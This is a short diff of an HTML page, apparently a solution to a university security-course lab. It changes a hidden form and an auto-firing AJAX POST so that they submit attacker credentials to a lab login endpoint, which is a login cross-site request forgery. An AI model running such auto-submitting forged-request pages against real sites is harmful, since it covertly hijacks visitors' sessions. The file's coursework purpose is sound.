@@ -1,13 +1,14 @@
 <html><body>
     <script src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <form id = "form1" method = "post" action = "https://example.com/submitcomment" style = "display: none">
-        <input name = "comment" value = "hello wordld">
+    <form id = "form1" method = "post" action = "https://project2.eecs388.org/login?csrfdefense=0&xssdefense=4" style = "display: none">
+        <input type="hidden" name="username" value="attacker" />
+        <input type="hidden" name="password" value="l33th4x" />	
     </form>
     <script>
         $.ajax({
             type: 'POST',
             data: $('#form1').serialize(),
-            url: 'https://example.com/submitcomment',
+            url: 'https://project2.eecs388.org/login?csrfdefense=0&xssdefense=4',
             xhrFields: {withCredentials: true}
         });
     </script>
